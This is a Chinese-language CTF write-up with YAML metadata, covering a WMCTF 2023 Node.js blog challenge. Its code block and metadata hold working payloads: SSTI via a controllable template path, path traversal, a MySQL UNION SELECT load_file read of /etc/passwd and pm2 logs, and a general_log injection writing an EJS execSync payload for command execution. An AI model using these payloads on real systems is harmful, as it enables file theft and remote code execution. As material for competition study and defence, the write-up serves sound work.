---
title: WMCTF 2023 writeup by Mini-Venom
contest: WMCTF 2023
year: 2023
difficulty: medium
vuln_type: ssti
tags:
- ssti_file_route
- path_traversal
- mysql_union_select
- load_file
- mysql_general_log_inject
- nodejs
- email_whitelist
- pm2_log_leak
- ctf_framework_ezblog
attack_chain: /api/debugger/template/test?file=日志路径触发模板 SSTI → /admin/../flag 路径穿越读 flag → 邮箱白名单 alice@example.com/bob@zhangkeji.com/.../jom@roomke.com → /post/11 union select load_file('/etc/passwd') 注入 → /post/11 union select load_file('/home/ezblog/.pm2/logs/main-out.log') 读 pm2 日志 → MySQL general_log 注入:SET GLOBAL general_log_file='/home/ezblog/views/index.ejs' + select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>'
key_payload: /post/11 union select load_file('/home/ezblog/.pm2/logs/main-out.log') / SET GLOBAL general_log_file='/home/ezblog/views/index.ejs'; select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>';
one_liner: WMCTF 2023 Mini-Venom 战队 4 题 WEB WP 速记，模板 SSTI 路径可控 + 路径穿越 + MySQL load_file 读 pm2 日志 + general_log 注入 EJS 模板。
lesson: 经典 general_log 注入 EJS 模板链：把 SQL 注入的 select 出口指向 .ejs 文件，注入 <%= process.mainModule.require("child_process").execSync("cmd") %> 执行任意命令。
quality: medium
full_path: WMCTF_2023_writeup_by_Mini-Venom.full.md
meta_path: WMCTF_2023_writeup_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 6
schema_version: v3.0.0-P0
summary: WMCTF 2023 writeup by Mini-Venom。WMCTF 2023 Mini-Venom 战队 4 题 WEB WP 速记，模板 SSTI 路径可控 + 路径穿越 + MySQL load_file 读 pm2 日志 + general_log 注入 EJS 模板。。经验：经典 general_log 注入 EJS 模板链：把 SQL 注入的 select 出口指向 .e...
category: web
subcategory: ssti
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 6
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/132359.html
wp_author: Mini-Venom
reasoning_chain:
- Ssti 触发点：/api/debugger/template/test?file=日志路径触发模板 SSTI → file= 路径可控
- 动作：file=刚才设置的日志 index → SSTI 触发 → 直接读 /admin/../flag 路径穿越拿 flag
- 触发点：邮箱白名单 alice@example.com / bob@zhangkeji.com / charlie@sanfeng.com / jom@roomke.com → 假设：注册绕过
- /post/11 union select load_file('/etc/passwd') → 假设：MySQL 注入可读文件
- 动作：/post/11 union select load_file('/home/ezblog/.pm2/logs/main-out.log') → 读 pm2 日志
- 假设：pm2 日志泄露 admin 操作 → /edit 修改 → 触发 general_log 注入
- general_log 注入：SET GLOBAL general_log_file='/home/ezblog/views/index.ejs'; select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>'
- 动作：MySQL 写入 index.ejs → 触发 Node EJS 渲染 → RCE 拿 flag
- 假设：必须先 load_file 找到 .pm2 日志路径，才能 general_log 注入 EJS 模板
failed_attempts:
- Ssti 试图直接 {{config}} 等关键字 → 失败：必须 file= 路径可控
- 试图直接 SELECT 出 flag → 失败：MySQL 用户没读 flag 权限
- general_log 注入 试图指向 .php → 失败：必须指向 EJS 模板才能渲染
key_observations:
- 经典 general_log 注入 EJS 模板链：把 SQL 注入的 select 出口指向 .ejs 文件，注入 <%= ...execSync('/readflag') %> 执行任意命令
- /post/11 union select load_file 是 MySQL 注入读文件标准手法
- pm2 日志是 Node.js 应用审计突破口，常泄露 admin 操作路径
- 邮箱白名单常见于注册绕过题（4 个邮箱 hash 必中）
- SSTI 路径可控时可直接 file= 控制模板名触发渲染
prerequisites:
- MySQL load_file 注入
- MySQL general_log 注入（SET GLOBAL general_log_file）
- EJS 模板渲染原理
- Node.js process.mainModule.require RCE
- pm2 日志路径结构
---
# WMCTF 2023 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/132359.html
> ID: 132359

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

Ssti

然后里面有个 /api/debugger/template/test 路由可以调试模板 同样这个渲染的模板文件名是可控的 直接file=刚才设置的日志 index就可以 ssti


```
/admin/../flag
{ "alice@example.com","bob@zhangkeji.com", Ucharlie@sanfeng.com""jom@roomke.com"}
http://b301a747-7ff2-4a8b-bae0-e5938179fb36.wmctf.wm-team.cn/post/11 union select load_file('/etc/passwd'),load_file('/etc/passwd'),load_file('/etc/passwd')/edit
http://b301a747-7ff2-4a8b-bae0-e5938179fb36.wmctf.wm-team.cn/post/11%20union%20select%20load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log'),load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log'),load_file('%2Fhome%2Fezblog%2F.pm2%2Flogs%2Fmain-out.log')/edit
CREATE TABLE mysql.general_log (
  event_time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  user_host mediumtext NOT NULL,
  thread_id int(11) NOT NULL,
  server_id int(10) unsigned NOT NULL,
  command_type varchar(64) NOT NULL,
  argument mediumtext NOT NULL
) ENGINE=CSV DEFAULT CHARSET=utf8 COMMENT='General log'
SET%20GLOBAL%20general_log_file%20%3D%20'%2Fhome%2Fezblog%2Fviews%2Findex.ejs'%3B
select%20'%3C%25%3D%20process.mainModule.require(%22child_process%22).execSync(%22%2Freadflag%22).toString()%20%25%3E'%3B
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]